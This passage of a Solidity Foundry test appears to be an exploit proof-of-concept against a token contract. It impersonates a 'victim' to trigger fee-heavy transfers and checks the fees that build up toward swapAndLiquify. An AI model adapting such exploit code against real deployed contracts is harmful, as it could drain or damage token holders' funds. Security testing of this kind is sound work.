        uint256 victimBalance = abi.decode(victimBalanceData, (uint256));

        if (victimBalance > 100 * 10**2) { // At least 100 tokens
            // Perform transfer - this will incur massive fees
            vm.prank(victim);
            TARGET.call(abi.encodeWithSignature("transfer(address,uint256)", recipient, 100 * 10**2));

            // The contract should now have accumulated fees
            // Check contract balance
            (, bytes memory contractBalanceData) = TARGET.call(abi.encodeWithSignature("balanceOf(address)", TARGET));
            uint256 contractBalance = abi.decode(contractBalanceData, (uint256));

            // If contract balance is above threshold, swapAndLiquify could be triggered
            // We can manually trigger it by transferring more tokens
            // Or wait for someone else to trigger it

            // For demonstration, let's do another transfer to accumulate more fees
            vm.prank(recipient);
            TARGET.call(abi.encodeWithSignature("transfer(address,uint256)", victim, 50 * 10**2));
